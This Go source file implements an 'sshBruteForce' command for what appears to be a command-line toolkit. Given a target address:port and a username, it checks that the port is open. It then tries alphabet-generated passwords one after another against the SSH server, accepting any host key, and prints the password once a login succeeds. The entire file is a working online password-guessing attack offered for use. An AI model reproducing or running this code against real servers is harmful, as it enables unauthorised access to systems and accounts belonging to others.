package commands

import (
	"fmt"
	"net"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/ngirot/BruteForce/bruteforce/words"

	"github.com/anvie/port-scanner"
	"github.com/fatih/color"
	"golang.org/x/crypto/ssh"
)

// SSHBruteForceCommand is a command, which try infinity passwords on an ssh server. But this took very long.
type SSHBruteForceCommand struct {
	name string
}

// GetName returns the name of the command
func (command SSHBruteForceCommand) GetName() string {
	return "sshBruteForce"
}

// GetDescription returns the description of the command
func (command SSHBruteForceCommand) GetDescription() string {
	return "A bruteforce attack on ssh servers"
}

func (command SSHBruteForceCommand) String() string {
	return "<Command 'sshBruteForce'>"
}

// IsWIP is a function which returns the state which defines if the command is unfinished developed
func (SSHBruteForceCommand) IsWIP() bool {
	return false
}

// RequiresSU is the function which returns if the command needs administrator access
func (SSHBruteForceCommand) RequiresSU() bool {
	return false
}

// Execute is a function which executes the sshBruteForce command
func (command SSHBruteForceCommand) Execute(kill chan bool, args []string) {
	if len(args) < 2 {
		fmt.Fprintln(color.Output, color.RedString("Usage: <address:port> <user>"))
		return
	}

	address := args[0]
	user := args[1]

	if strings.Contains(address, ":") {
		_, err := strconv.Atoi(strings.Split(address, ":")[1])
		if err != nil {
			fmt.Println("I need a valid port")
			return
		}
	} else {
		fmt.Println("Please give the address and the port me :)")
		return
	}

	ps := portscanner.NewPortScanner(strings.Split(address, ":")[0], 2*time.Second, 5)
	port, _ := strconv.Atoi(strings.Split(address, ":")[1])
	if ps.IsOpen(port) {
		fmt.Println("The port " + strconv.Itoa(port) + " is opened. Good job.")
	} else {
		fmt.Println("The port " + strconv.Itoa(port) + " is not opened")
		return
	}

	var tries = 0

	var worder = words.NewWorderAlphabet(words.DefaultAlphabet(), 1, 0)

	for {
		select {
		case <-kill:
			fmt.Println("\nAborted.")
			return
		default:
			var curPwd = worder.Next()
			result, _ := trySSHConnection(address, user, curPwd)
			tries++
			if !result {
				fmt.Printf("Success, your password is: %s\nTook %d tries\n", curPwd, tries)
				return
			}
			fmt.Fprintf(color.Output, "\r\rTook "+color.HiCyanString("%d")+" tries without result. password: %s", tries, color.CyanString(curPwd))
		}
	}
}

var numberOfChans = runtime.NumCPU()*2 + 1

func trySSHConnection(address string, user string, pass string) (result bool, erro error) {
	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
			return nil
		},
	}

	client, err := ssh.Dial("tcp", address, config)
	defer func() {
		if client != nil {
			client.Close()
		}
	}()
	erro = err
	result = err != nil
	return
}
